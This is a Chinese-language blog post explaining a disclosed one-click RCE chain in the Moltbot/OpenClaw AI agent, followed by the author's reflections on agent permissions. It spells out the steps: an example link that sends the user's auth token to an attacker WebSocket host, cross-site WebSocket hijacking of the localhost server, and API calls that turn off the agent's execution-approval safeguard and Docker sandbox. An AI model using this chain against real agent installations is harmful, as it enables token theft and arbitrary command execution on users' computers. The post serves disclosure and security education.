---
layout: post
title: "Moltbot 的 1-Click RCE：當你給 AI Agent 上帝權限"
date: 2026-02-02 00:30:00 +0800
categories: [AI, Engineering]
lang: zh
ref: moltbot-rce-god-mode-risks
image: /img/posts/moltbot-rce.webp
---

Hacker News 上有個帖子最近炸了，135 分加 59 條留言。一個叫 depthfirst 的安全公司揭露了 Moltbot（現在改名 OpenClaw）的重大漏洞：只要點一個惡意連結，攻擊者就能偷走你的 auth token、關掉所有安全防護、然後在你電腦上執行任意指令。

這不是什麼新奇的技術，甚至漏洞本身都算不上複雜。但它揭露了一個更大的問題：**當我們開始把電腦的控制權交給 AI agent，安全的遊戲規則已經不一樣了。**

## 漏洞本身其實不難懂

這個 RCE 是三個看似無害的設計串起來的：

1. **URL 參數可以改 Gateway URL**  
   Moltbot 的設定檔允許你透過 URL 參數 `?gatewayUrl=` 改變 gateway 位置，而且改完會直接存到 localStorage。這本身沒問題，很多應用都這樣做。

2. **改完設定就自動連線**  
   一旦你改了 `gatewayUrl`，應用會立刻嘗試連到新的 gateway，不會問你。這也還好，不然每次換環境都要手動重連很煩。

3. **連線時會帶上 auth token**  
   WebSocket 連線的 handshake 會自動帶上你的認證 token。這是標準做法，不然 gateway 怎麼知道你是誰？

現在把這三個「合理設計」串起來：攻擊者丟給你一個連結 `http://你的moltbot.com?gatewayUrl=ws://攻擊者.com:8080`，你一點開，應用就會自動連到攻擊者的假 gateway，然後把你的 auth token 拱手送出去。

這還只是第一步。

## localhost 也不是安全的

大部分人的 Moltbot 跑在 localhost 上，理論上外部網路碰不到。但攻擊者找到了另一個問題：**Moltbot 的 WebSocket server 不驗證 Origin header**。

這意味著你只要訪問攻擊者的網站 `attacker.com`，他就能在你的瀏覽器裡跑 JavaScript，開一個 WebSocket 連到 `ws://localhost:18789`，然後拿偷來的 token 登入你的本地 Moltbot。

這叫 Cross-Site WebSocket Hijacking (CSWSH)。不是什麼新招，但很有效。

## 最狠的是直接關掉安全防護

Moltbot 有兩層保護機制：
- `exec-approvals.json` 會在執行危險指令前問你
- 可以選擇在 Docker container 裡跑指令

但這些保護都是透過 API 控制的。而偷來的 token 有 `operator.admin` 和 `operator.approvals` 權限，所以攻擊者可以：

1. 送一個 `exec.approvals.set` request，把 `ask` 設成 `"off"`  
2. 送一個 `config.patch` request，把 `tools.exec.host` 改成 `"gateway"`

現在連 Docker 都沒了。直接在你的 host 上執行：

```text
node.invoke -> system.run -> bash -c 'echo hacked > /tmp/hacked'
```

完成。

## 這不只是一個 bug

寫到這裡你可能會想：「好啊,修掉就好了啊,有什麼好大驚小怪?」

確實,OpenClaw 團隊已經修掉了這個漏洞,加了一個 gateway URL 確認的 modal。問題解決了嗎?

技術上是。但這個事件暴露的問題更深層。

### Agent 的權限太大了

Moltbot 能做什麼？讀你的 iMessage、WhatsApp、Slack,存取你的 Stripe API key,在你電腦上跑任意指令。這不是 bug,這是設計。

為什麼？因為這是一個「personal AI assistant」,它需要這些權限才能幫你做事。問題是:當一個應用有這麼大的權限,你的攻擊面就變得非常大。傳統應用的漏洞頂多讓攻擊者偷資料,但 agent 的漏洞可以讓攻擊者**做任何你能做的事**。

### 快速迭代 vs 安全審查

Moltbot 是個開源專案,由社群驅動,迭代很快。這很好,開源本來就應該這樣。但問題是:有多少人在審查安全性？

depthfirst 用自動化工具掃出這個漏洞,他們的工具能「追蹤資料流」,把分散在不同檔案裡的邏輯串起來,找出這種「單獨看沒問題,組合起來就出事」的模式。

這種分析人工能做嗎?能,但很花時間。而社群專案通常沒有資源做這種深度審查。所以我們需要工具。問題是,多少人會用？

### 對工程師的警示

這個漏洞的每一步都是「常見做法」:
- URL 參數改設定 ✓
- 改完自動連線 ✓  
- WebSocket 帶 auth token ✓

但組合起來就變成 1-Click RCE。

這對我們寫 code 的啟示是什麼？**單個功能的安全性不夠,你要看整個系統的資料流。**

這很難。因為現代應用的邏輯本來就很分散,很多東西是非同步的、event-driven 的,你沒辦法從一個檔案看出全貌。這也是為什麼這種工具（像 depthfirst）有價值:它能幫你看到你看不到的東西。

但這也代表:如果你不用工具,你可能永遠不知道自己的 code 有這種問題。

## 我會繼續用 Moltbot 嗎？

會,但我會更小心。

這個漏洞被發現、被揭露、被修掉,整個過程很健康。depthfirst 的團隊走的是「responsible disclosure」,OpenClaw 團隊也快速回應。這是開源社群該有的樣子。

但我會記住一件事:**當你給 AI agent 上帝權限,你要確保這個上帝不會被別人控制。**

現在的 agent 框架大多還在「先跑起來再說」的階段,安全性不是第一優先。這可以理解,畢竟連基本功能都還在摸索。但隨著越來越多人把敏感資料交給 agent,這個問題遲早要面對。

我不確定答案是什麼。可能是更嚴格的權限控制、更好的沙盒、更多的自動化審查工具,或者三者都要。

但至少現在我們知道問題在哪了。這是第一步。

---

## References

- [1-Click RCE to steal your Moltbot data and keys - depthfirst](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys)
- [OpenClaw GitHub Security Advisory GHSA-g8p2-7wf7-98mq](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)
- [Hacker News discussion thread](https://news.ycombinator.com/item?id=46848769)
